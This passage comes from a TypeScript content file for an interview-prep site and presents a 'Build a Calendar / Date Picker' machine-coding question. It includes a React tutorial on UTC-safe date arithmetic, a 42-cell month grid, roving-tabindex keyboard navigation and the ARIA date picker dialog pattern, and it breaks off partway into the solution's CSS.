/**
 * Machine coding ULTRA — batch 18: calendars and editors (a single-date
 * Calendar / Date Picker, a range Date Picker, a Calendar Day View with
 * overlapping events, a Mini Spreadsheet, a basic Rich Text Editor, and a
 * drag-and-drop chunked File Uploader).
 *
 * Each question carries a §6 Question Body plus one bundle per framework
 * (React, Vue, Angular): a tutorial answer with the CLAUDE.md treatment
 * (story first, `📌 Interview term:` callouts, `.iq-diagram` SVGs, Verified
 * sections quoting real output, pitfalls, the §7 interview card, glossary,
 * conclusion) and a runnable multi-file solution for the site playground.
 *
 * Every solution was booted with scripts/verify-mc-solution.mjs on React
 * 19.3.1 (StrictMode createRoot), Vue 3.5.44 (createApp().mount) and Angular
 * 22.2.3 (bootstrapApplication with no providers, both AOT with strict
 * templates and runtime JIT) in jsdom 29.1.1, driven by one shared driver per
 * question; the three frameworks print identical driver output. The date
 * pickers were also run with TZ=America/New_York, Pacific/Auckland, UTC and
 * Asia/Kolkata. The Rich Text Editor and the File Uploader were additionally
 * driven in headless Chromium 141 through playwright-core (installed outside
 * the repo). No date, editor or upload libraries are used; servers are
 * simulated in-file.
 *
 * Generator and sources (outside the repo): the batch scratch directory
 * mc/b18 (gen.mjs, q1..q6/<framework> and one driver.mjs per question). Solution code is
 * read from the verified files, so it is byte-identical to what ran.
 * Conventions: SVG attributes double-quoted, no apostrophes inside <svg>,
 * no leading H1, `description` is plain markdown.
 */
import type { MachineCodingAugment } from "./machine-coding-augments.types";

const augments: MachineCodingAugment[] = [
  // ══════════════════════════════════════════════════════════════════════════
  {
    title: "Build a Calendar / Date Picker",
    seoDescription: "Build an accessible date picker from scratch in React, Vue and Angular: month grid math, DST-safe dates, keyboard grid navigation and ARIA dialog.",
    description: `**Question presented to candidate:**
"Build a date picker for our booking form, without a date library. A button shows the chosen date; clicking it opens a calendar for one month. The user can move between months and years, pick a day, and do all of it from the keyboard. Dates before a minimum must not be selectable, and today should stand out."

**Requirements:**
- A trigger button that opens a popup calendar and shows the selected date in words.
- A month grid with weekday headers, always 6 rows of 7 days, including leading and trailing days of the neighbouring months.
- Previous and next month and year buttons, disabled when the whole target month is out of range.
- Today highlighted, the selected day marked, days outside \`min\` / \`max\` disabled.
- Keyboard: arrows move by day and week, Home / End to the week edges, PageUp / PageDown by month, Shift+PageUp / PageDown by year, Enter or Space to select, Escape to close.
- Focus moves into the grid on open and returns to the trigger on close; clicking outside closes the popup.

**What a strong answer should cover:**
- Representing a calendar date without a time zone (an ISO \`YYYY-MM-DD\` string or a year/month/day triple), and doing day arithmetic through \`Date.UTC\` or the month-overflow trick, never by adding \`86400000\` ms to a local midnight.
- Grid generation: leading blanks from the weekday of the 1st, month lengths and leap years from \`new Date(y, m + 1, 0)\`, a fixed 42-cell grid.
- Keyboard grid navigation with a roving \`tabindex\`, and moving DOM focus after the re-render.
- The WAI-ARIA date picker dialog pattern: \`role="dialog"\`, \`role="grid"\`, \`aria-selected\`, \`aria-current="date"\`, a live month heading, a focus trap and focus return.
- Clamping: month jumps from the 31st land on the last day of a shorter month, and focus never leaves \`min\` / \`max\`.

**Clarifying questions expected:**
- "Which day does the week start on, and do we need locales other than English?"
- "Should picking a day close the popup, or is there an OK button?"
- "Can the user type a date as well, or only pick one?"

**Code / implementation expected:** Yes. A working component with the date helpers, the grid, keyboard handling and focus management.`,
    frameworks: {
      react: {
        answer: `**Target Audience:** Frontend candidates preparing for a machine coding round. Assumes basic React (state, props, effects) and no prior knowledge of calendar math or ARIA.
**Difficulty:** Hard

> **How to read this doc:** Every idea is explained in plain words first, then tagged with <code>📌 Interview term:</code> so you also learn the exact vocabulary an interviewer listens for. All output quoted under "Verified" was printed by the real solution, mounted in jsdom with React 19.3.1 in StrictMode and driven by a script, in three different time zones.

## 1. Why This Even Matters — A Story First

Think of the paper calendar on a hotel reception desk. The receptionist does not count days on her fingers: she flips to the right month, sees which weekday the 1st falls on, and points. When a guest says "same day next month", she flips one page and points at the same square, unless the month is shorter, in which case she points at its last day.

A date picker is that calendar, built in code. It looks simple, but it hides three classic traps that interviewers love:

1. **Time zones.** A JavaScript \`Date\` is a moment in time, not a square on a calendar. Mix the two and a user in New York sees the 1st of November twice.
2. **Focus.** A keyboard user has no mouse. Every arrow key must move a visible focus ring, and React re-renders must not throw that focus away.
3. **Accessibility semantics.** A screen reader user needs to hear "Saturday, February 10, 2024, selected", not "10".

This doc builds the single-date picker. The range version, with hover previews and blocked nights, is its own question: [Build a Date Picker Calendar with Range Selection](/interview-question/build-a-date-picker-calendar-with-range-selection). It assumes everything here.

## 2. Questions to Ask Your Interviewer First

| Question | Why it matters |
| :--- | :--- |
| Which day starts the week? | Sunday-first (US) and Monday-first (most of Europe) change the leading blanks; the solution keeps it as one constant. |
| Does picking a day close the popup, or is there an OK / Cancel footer? | Changes the keyboard contract: Enter selects and closes here; with a footer, Enter only moves the selection. |
| Is there a \`min\` / \`max\`, or a list of disabled dates? | Drives disabled cells, disabled nav buttons and focus clamping. |
| Can the user also type a date? | Typing needs parsing and validation; that is the [combobox](/interview-question/build-a-combobox-search-select) flavour of the pattern. |
| Which locales and calendars? | English month names are fine for an interview; production code would use \`Intl.DateTimeFormat\`. |
| Popup or always visible? | A popup needs the dialog pattern (focus trap, Escape, focus return); an inline calendar does not. |

## 3. Requirements and Plan

The component tree is small. One stateful component owns everything; the grid is plain markup.

<svg class="iq-diagram" width="100%" viewBox="0 0 640 300" role="img" aria-label="Component tree: App holds the value and renders DatePicker, which renders a trigger button and, when open, a dialog with a header and a grid of 42 day cells">
  <defs>
    <marker id="dp1r-arrow" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="230" y="12" width="180" height="50" rx="10"/>
  <text class="d-text" x="320" y="34" text-anchor="middle">App</text>
  <text class="d-sub" x="320" y="52" text-anchor="middle">value, setValue</text>
  <rect class="d-box-accent" x="210" y="104" width="220" height="50" rx="10"/>
  <text class="d-text d-accent" x="320" y="126" text-anchor="middle">DatePicker</text>
  <text class="d-sub" x="320" y="144" text-anchor="middle">open, focused</text>
  <rect class="d-box" x="30" y="214" width="170" height="50" rx="10"/>
  <text class="d-text" x="115" y="236" text-anchor="middle">Trigger button</text>
  <text class="d-sub" x="115" y="254" text-anchor="middle">aria-expanded</text>
  <rect class="d-box" x="240" y="214" width="170" height="50" rx="10"/>
  <text class="d-text" x="325" y="236" text-anchor="middle">Dialog header</text>
  <text class="d-sub" x="325" y="254" text-anchor="middle">4 nav buttons, h2</text>
  <rect class="d-box" x="450" y="214" width="170" height="50" rx="10"/>
  <text class="d-text" x="535" y="236" text-anchor="middle">Grid table</text>
  <text class="d-sub" x="535" y="254" text-anchor="middle">42 day cells</text>
  <path class="d-edge" d="M 320 62 L 320 100" marker-end="url(#dp1r-arrow)"/>
  <path class="d-edge" d="M 260 154 L 130 210" marker-end="url(#dp1r-arrow)"/>
  <path class="d-edge" d="M 320 154 L 324 210" marker-end="url(#dp1r-arrow)"/>
  <path class="d-edge" d="M 380 154 L 520 210" marker-end="url(#dp1r-arrow)"/>
</svg>

The parent owns the value (a **controlled component**: [controlled vs uncontrolled](/interview-question/what-is-the-difference-between-controlled-and-uncontrolled-components)). The picker owns only what the parent does not care about.

| Piece | Kind | Why |
| :--- | :--- | :--- |
| \`value\` | Prop from the parent | The chosen date, an ISO string such as \`"2024-02-10"\`, or \`null\`. |
| \`open\` | State | Whether the popup is shown. |
| \`focused\` | State | The day with the keyboard focus ring. |
| Visible month | **Derived** from \`focused\` | Never stored. If focus moves to March, the grid shows March. One source of truth, no sync bugs. |
| The 42 cells | Derived from the visible month | Recomputed each render; 42 string operations cost nothing. |
| \`wantFocus\` | Ref | "Move DOM focus after the next render." A flag, not something to render. |
| \`wrapRef\`, \`gridRef\`, \`triggerRef\` | Refs | DOM handles for outside-click, focusing a cell and returning focus. |

📌 **Interview term: Derived state** — a value you compute from other state during render instead of storing it. Deriving the visible month from the focused day removes a whole class of "the grid shows February but focus is in March" bugs.

## 4. Build It Step by Step

### 4.1 A date is a string, not a \`Date\`

📌 **Interview term: Calendar date vs instant** — a calendar date ("10 February 2024") has no time and no zone. A JavaScript \`Date\` is an *instant*: milliseconds since 1970 UTC, shown in the user's local zone. A booking form wants calendar dates.

The solution stores dates as ISO strings. They compare correctly with \`<\` and \`>\` (\`"2024-02-05" < "2024-02-10"\`), work as React keys, and cannot drift by an hour. All arithmetic goes through \`Date.UTC\`, because UTC has no daylight saving time:

\`\`\`js
export function toISO(y, m, d) {
  // overflow is normalised: (2024, 1, 30) is 1 March
  const t = new Date(Date.UTC(y, m, d));
  return (
    t.getUTCFullYear() +
    "-" +
    pad(t.getUTCMonth() + 1) +
    "-" +
    pad(t.getUTCDate())
  );
}
export const daysInMonth = (y, m) =>
  // day 0 = last day of previous month
  new Date(Date.UTC(y, m + 1, 0)).getUTCDate();
export const addDays = (iso, n) => {
  const { y, m, d } = parts(iso);
  return toISO(y, m, d + n);
};
// Jan 31 + 1 month is Feb 29 (2024),
// not Mar 2: clamp to the target month.
export const addMonths = (iso, n) => {
  const { y, m, d } = parts(iso);
  return toISO(y, m + n, Math.min(d, daysInMonth(y, m + n)));
};
\`\`\`

\`daysInMonth\` uses the "day zero" trick: day 0 of next month is the last day of this month, so leap years come for free (\`daysInMonth(2024, 1)\` is 29).

"Today" is the one place where the local zone matters: the user's today is their local calendar date, so \`todayISO()\` reads \`getFullYear()\`, \`getMonth()\` and \`getDate()\` once and converts to a string.

### 4.2 The 42-cell grid

\`\`\`js
export function monthGrid(y, m, weekStart = 0) {
  const first = toISO(y, m, 1);
  // blanks before the 1st
  const lead = (weekday(first) - weekStart + 7) % 7;
  const start = addDays(first, -lead);
  return Array.from({ length: 42 }, (_, i) => addDays(start, i));
}
\`\`\`

Always 42 cells (6 weeks) so the popup never changes height between months. A month can need 6 rows: when a 31-day month starts on a Friday or Saturday (Sunday-first weeks), or a 30-day month starts on a Saturday.

**Why not loop by 24 hours?** The tempting version is \`new Date(start.getTime() + i * 86400000)\`. A local day is not always 24 hours. This script compared that naive grid with \`monthGrid\`, under three \`TZ\` settings in Node 22:

\`\`\`text
TZ=UTC 2026-11 naive: 1,2,3,4,5,6,7,8,9,10... repeats=0 | utc: 1,2,3,4,5,6,7,8,9,10... repeats=0
TZ=America/New_York 2026-11 naive: 1,1,2,3,4,5,6,7,8,9... repeats=1 | utc: 1,2,3,4,5,6,7,8,9,10... repeats=0
TZ=America/New_York 2018-11 naive: 28,29,30,31,1,2,3,4,4,5... repeats=1 | utc: 28,29,30,31,1,2,3,4,5,6... repeats=0
TZ=Pacific/Auckland 2026-03 naive: 1,2,3,4,5,6,7,8,9,10... repeats=1 | utc: 1,2,3,4,5,6,7,8,9,10... repeats=0
\`\`\`

(Trimmed to the interesting lines.) In New York, 1 November 2026 has 25 hours, so "midnight plus 24 hours" is 23:00 on the same day and the grid shows **1, 1, 2**. Auckland repeats a day in early April, inside the March grid. The UTC version never does. And in \`America/Sao_Paulo\`, \`new Date(2018, 10, 4)\` printed \`Sun Nov 04 2018 01:00:00 GMT-0200\`: local midnight simply did not exist that day.

📌 **Interview term: DST (daylight saving time) transition** — the hour when clocks jump forward (a 23-hour day) or back (a 25-hour day). Any code that assumes a day is 86,400,000 ms is wrong twice a year in many zones. The modern fix is the Temporal API's \`PlainDate\` (see [Temporal and time zones](/interview-question/temporal-in-practice-how-do-you-correctly-handle-time-zones-dst-and-calendar-ari)); without it, do calendar math in UTC.

### 4.3 Roving tabindex on the grid

A grid of 42 focusable cells would cost a keyboard user 42 Tab presses. Instead, exactly one cell has \`tabIndex={0}\` (the focused day) and all the others have \`-1\`. Tab enters the grid once; arrows move inside it.

📌 **Interview term: Roving tabindex** — a composite widget keeps one child in the Tab order (\`tabindex="0"\`) and moves that "0" as the arrow keys move. Used by grids, toolbars, tabs and menus.

\`\`\`jsx
<td
  key={iso}
  className={cls}
  data-date={iso}
  tabIndex={iso === focused ? 0 : -1}
  aria-label={longLabel(iso)}
  aria-selected={iso === value}
  aria-disabled={off || undefined}
  aria-current={iso === today ? "date" : undefined}
  onClick={() => select(iso)}
>
  {parts(iso).d}
</td>
\`\`\`

The key is the ISO string, so it is unique across the 42 cells (see [the key prop](/interview-question/what-is-the-purpose-of-the-key-prop-when-rendering-lists-in-react)).

### 4.4 The keyboard map

\`\`\`js
function onGridKey(e) {
  const dow = (weekday(focused) - WEEK_START + 7) % 7;
  const moves = {
    ArrowLeft: () => addDays(focused, -1),
    ArrowRight: () => addDays(focused, 1),
    ArrowUp: () => addDays(focused, -7),
    ArrowDown: () => addDays(focused, 7),
    Home: () => addDays(focused, -dow),
    End: () => addDays(focused, 6 - dow),
    PageUp: () => addMonths(focused, e.shiftKey ? -12 : -1),
    PageDown: () => addMonths(focused, e.shiftKey ? 12 : 1),
  };
  if (moves[e.key]) {
    e.preventDefault();
    moveTo(moves[e.key](), true);
  } else if (e.key === "Enter" || e.key === " ") {
    e.preventDefault();
    select(focused);
  }
}
\`\`\`

These keys follow the W3C APG "Date Picker Dialog" example (arrows by day and week, Home / End to the week edges, Page Up / Down by month, Shift + Page Up / Down by year). \`preventDefault\` stops PageDown and Space from scrolling the page. Because the visible month is derived from \`focused\`, crossing a month edge with an arrow key re-renders the next month automatically.

\`moveTo\` clamps to \`min\` / \`max\`, so the focus ring can never sit on an unreachable day:

\`\`\`js
function moveTo(iso, takeFocus) {
  setFocused(clamp(iso, min, max));
  wantFocus.current = takeFocus;
}
\`\`\`

### 4.5 Moving DOM focus after the render

Setting state does not move the browser focus. The new cell does not even exist yet: it appears in the next commit. So the handler raises a flag in a ref, and an effect with no dependency array runs after every commit and acts only when the flag is up:

\`\`\`js
useEffect(() => {
  if (open && wantFocus.current) {
    wantFocus.current = false;
    gridRef.current?.querySelector('[tabindex="0"]')?.focus();
  }
});
\`\`\`

📌 **Interview term: Imperative focus management** — moving \`document.activeElement\` with \`.focus()\` after React has committed the DOM. A ref holds the flag because changing it must not cause another render ([useRef use cases](/interview-question/describe-the-useref-hook-and-its-typical-use-cases)). Clicking a nav button passes \`takeFocus = false\`, so the button keeps focus and repeated clicks work.

<svg class="iq-diagram" width="100%" viewBox="0 0 680 140" role="img" aria-label="Keyboard flow: keydown computes a target day, clamps it, sets state and a flag, React commits, then an effect focuses the cell with tabindex zero">
  <defs>
    <marker id="dp1r-arrow2" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="10" y="40" width="130" height="56" rx="10"/>
  <text class="d-text" x="75" y="64" text-anchor="middle">keydown</text>
  <text class="d-sub" x="75" y="84" text-anchor="middle">ArrowDown</text>
  <rect class="d-box" x="185" y="40" width="130" height="56" rx="10"/>
  <text class="d-text" x="250" y="64" text-anchor="middle">clamp</text>
  <text class="d-sub" x="250" y="84" text-anchor="middle">min and max</text>
  <rect class="d-box" x="360" y="40" width="130" height="56" rx="10"/>
  <text class="d-text" x="425" y="64" text-anchor="middle">commit</text>
  <text class="d-sub" x="425" y="84" text-anchor="middle">new month grid</text>
  <rect class="d-box-accent" x="535" y="40" width="135" height="56" rx="10"/>
  <text class="d-text d-accent" x="602" y="64" text-anchor="middle">effect</text>
  <text class="d-sub" x="602" y="84" text-anchor="middle">cell.focus()</text>
  <path class="d-edge-accent" d="M 140 68 L 181 68" marker-end="url(#dp1r-arrow2)"/>
  <path class="d-edge-accent" d="M 315 68 L 356 68" marker-end="url(#dp1r-arrow2)"/>
  <path class="d-edge-accent" d="M 490 68 L 531 68" marker-end="url(#dp1r-arrow2)"/>
</svg>

State first, DOM focus second: the order is what makes month changes from the keyboard feel seamless.

### 4.6 The dialog: trap, Escape, return, outside click

📌 **Interview term: Date picker dialog pattern** — the WAI-ARIA Authoring Practices pattern: a button opens a \`role="dialog"\` (here \`aria-modal="true"\`), focus moves to the selected day (or today), the calendar is a \`role="grid"\`, Escape closes, and focus goes back to the button.

\`\`\`js
function onDialogKey(e) {
  if (e.key === "Escape") {
    e.preventDefault();
    close(true);
    return;
  }
  // focus trap: wrap Tab / Shift+Tab inside the dialog
  if (e.key !== "Tab") return;
  const items = [
    ...e.currentTarget.querySelectorAll(
      'button:not([disabled]), [tabindex="0"]',
    ),
  ];
  const i = items.indexOf(document.activeElement);
  const next = e.shiftKey
    ? i <= 0
      ? items.length - 1
      : i - 1
    : i === items.length - 1
      ? 0
      : i + 1;
  e.preventDefault();
  items[next].focus();
}
\`\`\`

The trap only looks at enabled buttons and the single \`tabindex="0"\` cell, which is the roving tabindex paying off again. A fuller treatment of traps lives in [Build an Accessible Modal with Focus Trap & Scroll Lock](/interview-question/build-an-accessible-modal-with-focus-trap-scroll-lock).

Outside click is a document listener that exists only while the popup is open. The cleanup function removes it, which also keeps it correct under StrictMode, where React mounts, unmounts and re-mounts effects once in development ([effect cleanup](/interview-question/what-is-the-purpose-of-the-cleanup-function-in-useeffect)):

\`\`\`js
useEffect(() => {
  if (!open) return;
  const onDown = (e) => {
    if (!wrapRef.current?.contains(e.target)) setOpen(false);
  };
  document.addEventListener("mousedown", onDown);
  return () => document.removeEventListener("mousedown", onDown);
}, [open]);
\`\`\`

A nav button is disabled when every day of the target month is out of range: \`toISO(y, m, 0) < min\` is "the last day of the previous month is before min".

## 5. Verified

The solution was mounted exactly as the playground boots it (\`createRoot(...).render(<StrictMode><App /></StrictMode>)\`) in jsdom, with \`min="2024-02-05"\` and an initial value of 10 February 2024. One driver clicked, pressed keys and tabbed; the same driver ran the Vue and Angular versions. Output, run with \`TZ=America/New_York\`:

\`\`\`text
TZ=America/New_York trigger: "Saturday, February 10, 2024"
open: dialog | expanded: true | focus: 2024-02-10
February 2024: 2024-01-28 .. 2024-03-09 (42 cells, strictly increasing: true)
Feb 1 disabled (min 2024-02-05): true | Prev month disabled: true
click Feb 1 (disabled) -> still open | Selected: 2024-02-10
after Right, Down, End, Home, Up, Up -> focus: 2024-02-05 (clamped at min)
PageDown -> 2024-03-05 | March 2024
Left, PageUp -> 2024-02-05
Shift+PageDown -> 2025-02-05 | tabindex=0 cells: 1
March 2026: 2026-03-01 .. 2026-04-11 (42 cells, strictly increasing: true)
November 2026: 2026-11-01 .. 2026-12-12 (42 cells, strictly increasing: true)
Previous year button -> November 2025 | focus stays on: Previous year
Tab x5: Previous month > Next month > Next year > 2025-11-05 > Previous year | Shift+Tab: 2025-11-05
Enter -> dialog: closed | focus: trigger | Selected: 2025-11-05
reopen focus: 2025-11-05 | selected cell aria-selected: 2025-11-05
Escape -> dialog: closed | focus: trigger | Selected: 2025-11-05
reopened: open
mousedown outside -> closed
\`\`\`

What to read from it:

- **Leap year:** February 2024 starts on Thursday, so the grid starts on Sunday 28 January; it shows 29 February and ends on 9 March.
- **DST months:** March 2026 (US clocks spring forward on the 8th) and November 2026 (fall back on the 1st) both produced 42 distinct, increasing days. The output was byte-identical with \`TZ=Pacific/Auckland\` and \`TZ=UTC\`.
- **Clamping:** the second ArrowUp from 11 February would land on the 4th, before \`min\`, so focus stopped on the 5th; "Left, PageUp" from 5 March went to 4 February and clamped to the 5th.
- **Focus:** the dialog opened with focus on the selected day, Tab cycled through only 5 stops and wrapped, Enter selected and returned focus to the trigger.

Two driver details are honest limits of jsdom: jsdom does not focus a button when it is clicked (real Chrome and Firefox do), so the driver focused "Previous year" itself before clicking; and the outside mousedown was dispatched by the script. Visual layout (the popup position, the focus ring) was not checked here.

## 6. Edge Cases and Accessibility

| Concern | How the solution handles it |
| :--- | :--- |
| Leap years and month lengths | \`Date.UTC(y, m + 1, 0)\` (day zero) |
| DST and time zones | ISO strings plus UTC arithmetic; verified in 3 zones |
| Jan 31 + 1 month | \`addMonths\` clamps to the last day (29 Feb in 2024) |
| Focus outside \`min\` / \`max\` | \`clamp\` in \`moveTo\`; nav buttons disabled for fully blocked months |
| Screen reader day names | \`aria-label="Saturday, February 10, 2024"\` on each cell, \`abbr\` on the weekday headers |
| Selected and today | \`aria-selected="true"\` and \`aria-current="date"\` |
| Month announced on change | the \`h2\` has \`aria-live="polite"\` and labels both dialog and grid |
| Popup open state | \`aria-haspopup="dialog"\` and \`aria-expanded\` on the trigger |
| Keyboard escape hatch | Escape closes and focus returns to the trigger |
| Page scroll on PageDown / Space | \`preventDefault()\` on handled keys |

## 7. Common Pitfalls

- **Looping days by \`+ 86400000\` ms.** Verified above: New York shows 1 November twice. Do day math in UTC or with calendar fields.
- **Storing the visible month separately from the focused day.** Two pieces of state that must agree will eventually disagree. Derive one from the other.
- **Calling \`.focus()\` in the key handler.** The target cell is not rendered yet. Set a flag and focus after the commit.
- **Making every cell tabbable.** Use a roving tabindex: one \`tabindex="0"\`, the rest \`-1\`.
- **\`new Date("2024-02-10")\` for parsing.** A date-only ISO string is parsed as UTC midnight, so \`getDate()\` returns the 9th anywhere west of Greenwich (with \`TZ=America/New_York\`, Node printed \`9\`; \`new Date("2024-02-10T00:00")\` printed \`10\`). Split the string instead.
- **Month jumps without clamping.** \`setMonth(1)\` on 31 January 2024 printed \`Sat Mar 02 2024\`. Clamp the day to the target month length.

## 8. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Clarify:</strong> <span style="color:#f0e2c8;">"I will confirm the week start, whether selecting closes the popup, and the min and max rules, then sketch one stateful component with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">open</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Date model:</strong> <span style="color:#f0e2c8;">"Dates are ISO strings like <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">2024-02-10</code>, and all arithmetic goes through <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Date.UTC</code>, so daylight saving can never duplicate a day."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Grid:</strong> <span style="color:#f0e2c8;">"The grid is 42 cells starting at the week start before the 1st; month length comes from day zero of the next month."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Keyboard:</strong> <span style="color:#f0e2c8;">"Arrows, Home, End and PageUp or PageDown move <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">focused</code>; the visible month is derived from it, and an effect moves DOM focus to the one cell with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">tabindex</code> 0."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Dialog:</strong> <span style="color:#f0e2c8;">"It is the APG date picker dialog: focus in on open, a Tab trap, Escape closes and focus returns to the trigger, plus <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-selected</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-current</code>."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you support Monday-first weeks or other locales?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">The grid already takes <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">weekStart</code>. For names I would use <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Intl.DateTimeFormat</code> with the user locale for month and weekday labels, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">Intl.Locale</code> week info where browsers support it, falling back to a configured first day.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Why not just use <code style="background:#4a3418;color:#ffe0b2;padding:1px 5px;border-radius:3px;">input type=date</code>?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">The native input is a good default and accessible, but its popup cannot be styled consistently, cannot show blocked dates, and differs per browser. A custom picker is justified when design or business rules need it.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test this?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Unit-test the pure helpers (<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">monthGrid</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">addMonths</code>) with a <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">TZ</code> matrix in CI, then component tests that press keys and assert <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">document.activeElement</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-selected</code>, plus one real-browser test for focus and layout.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">What changes if the server sends timestamps?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Convert at the boundary: turn the instant into a calendar date in the right zone once (for a hotel, the hotel zone), and keep the picker working on plain dates. Temporal <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">PlainDate</code> makes that explicit.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How do you avoid re-rendering 42 cells on every key press?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">42 cells is cheap. If profiling showed a problem I would memoise the cell component, but the real cost in pickers is usually layout, not React.</span>
</div>

</div>

## 9. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Derived state** | A value computed during render from other state, never stored |
| **Calendar date vs instant** | A day on the calendar versus a moment in time with a zone |
| **DST transition** | The day clocks jump, so the local day has 23 or 25 hours |
| **Roving tabindex** | One child has \`tabindex="0"\`, arrows move it, the rest are \`-1\` |
| **Imperative focus management** | Calling \`.focus()\` after the DOM has been committed |
| **Date picker dialog pattern** | The WAI-ARIA recipe: dialog, grid, Escape, focus return |
| **Controlled component** | The parent owns the value and passes it down with a change callback |

---
**Conclusion:** A date picker is three small systems wired together: calendar math that ignores time zones (ISO strings and \`Date.UTC\`), a 42-cell grid whose visible month is derived from the focused day, and a focus contract (roving tabindex, an after-commit effect, a dialog trap and focus return). The verified run shows the payoff: the same grid in New York, Auckland and UTC, focus that follows every key, and clamping that keeps the user inside the allowed range. Say those three systems out loud in the interview and build them in that order.`,
        files: {
          "/App.js": `import { useState } from "react";
import DatePicker from "./src/DatePicker";

const css = \`
  body { margin: 0; background: #0f1115; color: #e6e6e6; font-family: system-ui, sans-serif; }
  .page { max-width: 420px; margin: 0 auto; padding: 24px 16px; }
  .dp { position: relative; display: flex; flex-direction: column; gap: 6px; }
  .dp-label { font-size: 13px; color: #9aa4b2; }
  .dp-trigger { text-align: left; padding: 10px 12px; border-radius: 8px; border: 1px solid #2c3340;
    background: #171a21; color: inherit; font: inherit; cursor: pointer; }
  .dp-pop { position: absolute; top: 100%; left: 0; margin-top: 6px; z-index: 10; width: min(320px, 100%);
    background: #171a21; border: 1px solid #2c3340; border-radius: 12px; padding: 12px; box-shadow: 0 10px 30px #0008; }
  .dp-head { display: flex; align-items: center; gap: 4px; margin-bottom: 8px; }
  .dp-head h2 { flex: 1; text-align: center; font-size: 15px; margin: 0; }
  .dp-head button { background: none; border: 0; color: #c9d1d9; font-size: 18px; width: 32px; height: 32px; border-radius: 6px; cursor: pointer; }
  .dp-head button:disabled { opacity: .3; cursor: default; }
  table { width: 100%; border-collapse: collapse; }
